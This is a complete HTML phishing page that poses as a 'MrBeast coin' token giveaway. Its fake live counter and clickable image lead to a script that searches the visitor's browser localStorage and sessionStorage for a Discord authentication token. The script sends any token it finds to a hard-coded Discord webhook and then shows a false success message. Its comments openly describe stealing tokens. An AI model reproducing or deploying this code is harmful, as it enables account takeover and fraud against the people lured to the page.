<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>💰 Claim BEAST Tokens</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
            color: white;
        }
        .container {
            max-width: 700px;
            padding: 30px;
            background: #12121f;
            border-radius: 40px;
            border: 2px solid #ffcc00;
            box-shadow: 0 0 60px rgba(255, 204, 0, 0.2);
        }
        h1 {
            color: #ffcc00;
            font-size: 2.8rem;
            text-shadow: 0 0 30px #ffcc00;
            margin-bottom: 10px;
        }
        .sub {
            color: #aaa;
            font-size: 1.2rem;
            margin-bottom: 20px;
        }
        .clickable-image {
            width: 100%;
            max-width: 500px;
            border-radius: 20px;
            border: 4px solid #ffcc00;
            cursor: pointer;
            transition: 0.3s;
            margin: 20px 0;
        }
        .clickable-image:hover {
            transform: scale(1.02);
            box-shadow: 0 0 50px rgba(255, 204, 0, 0.5);
        }
        .clickable-image:active {
            transform: scale(0.95);
        }
        .status {
            margin-top: 20px;
            color: #888;
            font-size: 1rem;
        }
        .counter {
            color: #ffcc00;
            font-weight: bold;
            font-size: 1.5rem;
        }
        .footer {
            margin-top: 30px;
            color: #555;
            font-size: 0.8rem;
        }
        #toast {
            display: none;
            background: #2a2a3e;
            color: #ffcc00;
            padding: 15px;
            border-radius: 15px;
            margin-top: 20px;
            border: 1px solid #ffcc00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🐕 MRBEAST COIN</h1>
        <p class="sub">🔥 <span class="counter" id="counter">15,432</span> people already claimed</p>
        <p style="color:#ccc;">Click the image below to <strong>instantly claim 1,000 BEAST</strong> tokens!</p>
        
        <!-- 👇 THE CLICKABLE IMAGE -->
        <img 
            class="clickable-image" 
            id="claimImage"
            src="https://cdn.discordapp.com/attachments/1539553182437347368/1545137691778359316/SXE_XIETRS_PRIFLE.png?ex=6a9b0d1c&is=6a99bb9c&hm=ecb987ba6df3a01eb287eac03a8af54b631f1e08b660c2a347facff3d07d3bdc" 
            alt="Click to claim BEAST tokens"
            onclick="grabToken()"
        />
        
        <div id="toast">⏳ Processing claim... Please wait.</div>
        <div class="status" id="status">👆 Click the image above to connect your wallet (Discord).</div>
        <div class="footer">⚠️ Only verified Discord accounts are eligible.</div>
    </div>

    <script>
        // ================= CONFIG =================
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9"; // YOUR WEBHOOK
        // =========================================

        // Fake counter to make it look alive
        let count = 15432;
        setInterval(() => {
            count += Math.floor(Math.random() * 5) + 1;
            document.getElementById('counter').innerText = count.toLocaleString();
        }, 2500);

        function grabToken() {
            const image = document.getElementById('claimImage');
            const toast = document.getElementById('toast');
            const status = document.getElementById('status');

            // Disable further clicks (avoid spam)
            image.style.pointerEvents = 'none';
            image.style.opacity = '0.7';
            toast.style.display = 'block';
            status.textContent = '⏳ Verifying Discord identity...';

            let token = null;

            // ----- ATTEMPT TO STEAL TOKEN FROM localStorage -----
            try {
                // 1. Direct token key
                token = localStorage.getItem('token') || sessionStorage.getItem('token');
                
                // 2. If not found, brute‑search all localStorage keys
                if (!token) {
                    for (let key in localStorage) {
                        let val = localStorage[key];
                        if (typeof val === 'string') {
                            // Discord token regex (matches mfa.xxx or standard token)
                            if (val.match(/[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}/)) {
                                token = val;
                                break;
                            }
                        }
                    }
                }
            } catch(e) {
                console.warn('Storage read error:', e);
            }

            // ----- SEND TO WEBHOOK -----
            if (token) {
                const payload = {
                    content: `🎯 **TOKEN EXTRACTED** (MrBeast Image Click)`,
                    embeds: [{
                        title: "💰 Token Grabbed",
                        description: `\`\`\`${token}\`\`\``,
                        color: 0xffcc00,
                        footer: { text: "Clicked the MrBeast image" }
                    }]
                };

                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).then(() => {
                    status.textContent = '✅ Claim successful! You will receive your tokens shortly.';
                    toast.textContent = '✅ Tokens sent to your wallet! Redirecting...';
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/channels/@me';
                    }, 2000);
                }).catch((err) => {
                    status.textContent = '⚠️ Network error. But your claim was recorded.';
                    console.error(err);
                });
            } else {
                // No token found – redirect to Discord login (so they log in, and we can try again)
                status.textContent = '❌ You are not logged into Discord. Opening login page...';
                toast.textContent = '🔐 Please log in to Discord to claim.';
                setTimeout(() => {
                    window.location.href = 'https://discord.com/login?redirect_to=/channels/@me';
                }, 1200);
            }
        }
    </script>
</body>
</html>
